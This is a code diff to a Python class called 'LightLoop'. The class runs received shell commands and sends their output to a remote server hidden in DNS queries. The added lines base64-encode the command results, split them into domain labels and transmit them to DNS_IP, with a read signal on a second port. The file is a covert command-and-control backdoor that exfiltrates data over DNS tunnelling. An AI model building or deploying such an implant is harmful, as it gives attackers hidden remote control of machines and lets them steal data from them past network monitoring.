@@ -60,28 +60,33 @@ class LightLoop:
                 res = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=to)
             except subprocess.CalledProcessError as e:
                 res = e.output
+            # OUTPUT USING DNS PROTOCOL
             out_url = self._get_output_url(res)
+            print("Building output packet and then sending...")
             out_packet = self.build_packet(out_url)
-            sock1.sendto(bytes(packet), (DNS_IP, DNS_PORT))
+            sock1.sendto(bytes(out_packet), (DNS_IP, DNS_PORT))
+            sock1.recvfrom(512)
+            print("[-] Packet sent!")
+            time.sleep(1)
             sock.sendto("1".encode('utf-8'), (DNS_IP, DNS_SIGNAL_PORT))
-            #sock.sendto(base64.b64encode(res), (DNS_IP, DNS_SIGNAL_PORT))
+            print("Sent read signal...")
+            # DNS PROTOCOL IS LIMITED IN OUTPUT (<255 CHARACTERS)
+            #sock.sendto(base64.b64encode(res), (DNS_IP, DNS_SIGNAL_PORT)) - OUTPUT USING UDP
 
     def _get_output_url(self, res):
         out = (base64.b64encode(res)).decode('utf-8')
-        url = "none.none.none"
+        url = "normal.realdomain.legit"
         last = 0
         temp_url = ""
+        step = int(len(out) / 3)
         if ((len(out) > 189) or (len(out) == 0)):
             return url
-        for i in range(63, len(out), 63):
-            temp_url += out[last:63]
+        for i in range(step, len(out), step):
+            temp_url += out[last:i]
             temp_url += '.'
             last = i
         temp_url += out[last:len(out)]
         return temp_url
-
-    def _send_output_packet(self, url):
-
         
 
     def get_ip(self):
